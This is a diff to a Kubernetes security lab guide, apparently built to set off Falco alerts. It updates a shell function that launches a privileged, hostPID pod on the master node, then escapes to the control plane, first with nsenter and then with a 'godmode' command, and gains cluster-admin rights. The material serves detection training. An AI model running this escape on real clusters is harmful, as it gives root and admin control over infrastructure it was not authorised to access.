@@ -485,28 +485,30 @@ docker run -it --rm falcosecurity/event-generator run syscall --loop
 
 ```sh
 function shell () {
-  kubectl run shell --restart=Never -it --image krisnova/hack:latest \
+  kubectl run shell --restart=Never -it --image mawinkler/kod:latest \
   --rm --attach \
   --overrides \
-        '{
-          "spec":{
-            "hostPID": true,
-            "containers":[{
-              "name":"scary",
-              "image": "krisnova/hack:latest",
-	      "imagePullPolicy": "Always",
-              "stdin": true,
-              "tty": true,
-              "command":["/bin/bash"],
-	      "nodeSelector":{
-		"dedicated":"master" 
-	      },
-              "securityContext":{
-                "privileged":true
-              }
-            }]
+    '
+    {
+      "spec":{
+        "hostPID": true,
+        "containers":[{
+          "name":"kod",
+          "image": "mawinkler/kod:latest",
+          "imagePullPolicy": "Always",
+          "stdin": true,
+          "tty": true,
+          "command":["/bin/bash"],
+          "nodeSelector":{
+            "dedicated":"master"
+          },
+          "securityContext":{
+            "privileged":true
           }
-        }'
+        }]
+      }
+    }
+    '
 }
 ```
 
@@ -525,11 +527,22 @@ shell
 If you don't see a command prompt, try pressing enter.
 
 ```sh
-root@shell:/# nsenter -t 1 -m -u -i -n bash
+root@shell:/# godmode
 root@playground-control-plane:/# 
 ```
 
-Doing this takes advantage of a well known security exploit in Kubernetes.
+You're now on the control plane of the cluster and should be kubernetes-admin.
+
+If you're wondering what you can do now...
+
+```sh
+kubectl auth can-i create deployments -n kube-system
+```
+
+```sh
+kubectl create deployment echo --image=inanimate/echo-server
+kubectl get pods
+```
 
 ### Access Falco UI
 
